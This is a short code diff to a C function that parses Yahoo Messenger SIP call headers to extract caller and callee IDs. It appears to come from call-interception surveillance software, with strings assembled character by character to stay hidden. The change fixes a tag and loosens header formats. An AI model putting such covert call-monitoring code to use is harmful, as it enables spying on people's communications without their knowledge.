@@ -2535,7 +2535,7 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	char YID[64];
 	char invite[10];
 	DWORD seq = 0xfffffff;
-	char sip_tag[] = { 'S', 'I', 'P', '/', '2', '.', '0', ' ', '2', '0', '0', ' ', 'O', 'K', '+', 0x0 }; //"SIP/2.0 200 OK"
+	char sip_tag[] = { 'S', 'I', 'P', '/', '2', '.', '0', ' ', '2', '0', '0', ' ', 'O', 'K', 0x0 }; //"SIP/2.0 200 OK"
 	char to_tag[] = { 'T', 'o', ':', ' ', 0x0 }; //"To: "
 	char to_sip[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"To: <sip:"
 	char to_sip_format[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"To: <sip:%63s"
@@ -2545,6 +2545,9 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	char from_sip_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"From: <sip:%63s"
 	char call_id_tag[] = { 'C', 'a', 'l', 'l', '-', 'I', 'D', ':', ' ', 0x0 }; //"Call-ID: "
 	char call_seq_tag[] = { 'C', 'S', 'e', 'q', ':', ' ', 0x0 }; //"CSeq: "
+
+	char to_format[] = { 'T', 'o', ':', ' ', '%', '6', '3', 's', 0x0 }; //"To: %63s"
+	char from_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '%', '6', '3', 's', 0x0 }; //"From: %63s"
 
 	if (*pdwFlags & FLAGS_YMSG_IN) {
 		// Nuova chiamata
@@ -2558,7 +2561,7 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 					if(tmp = strstr(YID, "@"))
 						tmp[0] = 0;
 				} else {
-					sscanf(ptr, to_sip_format, YID);
+					sscanf(ptr, to_format, YID);
 					if(tmp = strstr(YID, minus_sip))
 						tmp[0] = 0;
 				}
@@ -2579,7 +2582,7 @@ BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 					if(tmp = strstr(YID, "@"))
 						tmp[0] = 0;
 				} else {
-					sscanf(ptr, from_sip_format, YID);
+					sscanf(ptr, from_format, YID);
 					if(tmp = strstr(YID, minus_sip))
 						tmp[0] = 0;
 				}
